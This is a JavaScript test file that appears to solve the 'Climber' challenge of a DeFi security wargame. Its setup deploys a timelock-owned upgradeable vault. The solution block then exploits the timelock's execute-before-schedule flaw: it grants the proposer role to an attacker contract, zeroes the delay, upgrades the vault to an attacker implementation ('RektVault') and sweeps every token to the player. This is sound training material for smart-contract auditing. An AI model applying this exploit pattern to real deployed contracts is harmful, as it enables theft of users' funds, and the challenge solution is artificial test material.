const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, player;
  let timelock, vault, token;

  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TIMELOCK_DELAY = 60 * 60;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await vault.getSweeper()).to.eq(sweeper.address);
    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await vault.owner();
    timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock delay is correct and cannot be changed
    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
    await expect(
      timelock.updateDelay(TIMELOCK_DELAY + 1)
    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

    // Ensure timelock roles are correctly initialized
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attack12 = await ethers.getContractFactory("Attack12", deployer);
    const attack12 = await Attack12.deploy(
      timelock.address,
      vault.address,
      token.address,
      player.address
    );

    // Deploy the new RektVault implementation
    const RektVault = await ethers.getContractFactory("RektVault", player);
    const rektVault = await RektVault.deploy();

    // Helper function to create ABIs
    const createInterface = (abi, methodName, args) => {
      const IFace = new ethers.utils.Interface(abi);
      const ABIData = IFace.encodeFunctionData(methodName, args);
      return ABIData;
    };

    // Set attacker contract as proposer for timelock
    const PROPOSER_ROLE = ethers.utils.keccak256(
      ethers.utils.toUtf8Bytes("PROPOSER_ROLE")
    );
    const grantRoleABI = ["function grantRole(bytes32 role, address account)"];
    const grantRoleData = createInterface(grantRoleABI, "grantRole", [
      PROPOSER_ROLE,
      attack12.address,
    ]);

    // Set delay to 0 so we can do everything in 1 transaction
    const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
    const updateDelayData = createInterface(updateDelayABI, "updateDelay", [0]);

    // Call to the vault to upgrade to attacker controlled contract logic
    const upgradeToABI = ["function upgradeTo(address newImplementation)"];
    const upgradeToData = createInterface(upgradeToABI, "upgradeTo", [
      rektVault.address,
    ]);

    // Call Attacking Contract to schedule these actions and sweep funds
    const attackABI = ["function attack()"];
    const attackData = createInterface(attackABI, "attack", undefined);

    const targets = [
      timelock.address,
      timelock.address,
      vault.address,
      attack12.address,
    ];
    const data = [grantRoleData, updateDelayData, upgradeToData, attackData];

    // Launch the attack
    await attack12.connect(player).setScheduleData(targets, data);
    await timelock
      .connect(player)
      .execute(
        targets,
        Array(data.length).fill(0),
        data,
        ethers.utils.hexZeroPad("0x00", 32)
      );

    // Check the player's new token balance
    const playerTokenBalance = await token.balanceOf(player.address);
    console.log(
      "New player token balance: ",
      ethers.utils.formatEther(playerTokenBalance).toString()
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
